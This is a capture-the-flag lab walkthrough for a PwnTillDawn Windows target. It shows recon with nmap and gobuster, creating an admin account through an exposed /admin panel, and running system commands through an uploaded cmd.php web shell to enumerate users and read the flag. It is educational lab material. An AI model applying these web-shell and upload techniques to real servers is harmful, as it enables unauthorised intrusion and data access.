# PwnTillDawn — CTF Walkthrough

## 1. Reconnaissance

Using `nmap` to scan the target:

```bash
nmap -sC -sV -Pn -vv 10.150.150.11

Open ports found:

    FTP (21)

    HTTP (80)

Focus moves to HTTP.
2. Web Enumeration

Directory brute‑forcing with gobuster:
bash

gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt

Interesting directories discovered:
/admin, /components, /css, /img, /inc, /upload, /utils, /vendor

After manual exploration, /upload and /admin are the most important.
/upload directory listing
text

Index of /upload

Name                    Last modified     Size Description
Parent Directory                         -   
2/                      2020-11-17 05:42  -   
10/                     2020-11-16 10:44  -   
11/                     2024-03-21 06:49  -   

/admin directory listing
text

Index of /admin

Name                    Last modified     Size
Parent Directory                         -   

Server header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9

I explored both. Nothing noteworthy in /upload, so I started with /admin.
3. Gaining Access

By clicking through the /admin panel, I managed to gain access control. I created a user with admin privileges to test.

Create User – success.

Then I logged in using the user I created.

Now I had administrator access — I could view, edit, and delete users (including the original admin), and upload files.
Reverse Shell Attempt

I created a PHP file containing a reverse shell payload and uploaded it to the admin's personal file area.

Problem: After uploading, I was stuck. Clicking the shell file did nothing.
Command Injection via Web Shell — Success

I tried command injection directly through a web shell. It worked.

Example:
text

http://10.150.150.11/upload/cmd.php?cmd=hostname

Response: PwnDrive
text

http://10.150.150.11/upload/cmd.php?cmd=net user

Response:
text

User accounts for \\

Administrator    Guest            Jboden
tony
The command completed with one or more errors.

4. Maintaining Access & Privilege Escalation

I enumerated user directories:
text

http://10.150.150.11/upload/cmd.php?cmd=dir C:\Users\

Output:
text

Volume in drive C has no label.
Volume Serial Number is F80A-FDD9

Directory of C:\Users

07/16/2020 06:44 AM    <DIR>          .
07/16/2020 06:44 AM    <DIR>          ..
06/27/2016 12:21 AM    <DIR>          Administrator
06/27/2016 02:05 AM    <DIR>          Classic .NET AppPool
03/28/2020 09:01 AM    <DIR>          Jboden
06/27/2016 01:58 AM    <DIR>          MSSQL$SQLEXPRESS
07/13/2009 09:57 PM    <DIR>          Public
07/16/2020 06:44 AM    <DIR>          tony
               0 File(s)              0 bytes
               8 Dir(s)  21,098,795,008 bytes free

I focused on the Administrator folder.
text

http://10.150.150.11/upload/cmd.php?cmd=dir C:\Users\Administrator\Desktop

Output showed a flag file.
text

http://10.150.150.11/upload/cmd.php?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt

Result:
text

PwnTillDawnAcademyIsAwesome!!!

Summary
Step	Action	Result
1	Nmap scan	Ports 21, 80 open
2	Gobuster directory brute‑force	Found /admin and /upload
3	Admin panel access	Created admin user, logged in
4	Uploaded reverse shell	Stuck (no execution)
5	Command injection via cmd.php	Working web shell
6	Enumerated users and directories	Found Administrator\Desktop
7	Read FLAG1.txt	PwnTillDawnAcademyIsAwesome!!!

Final Flag: PwnTillDawnAcademyIsAwesome!!!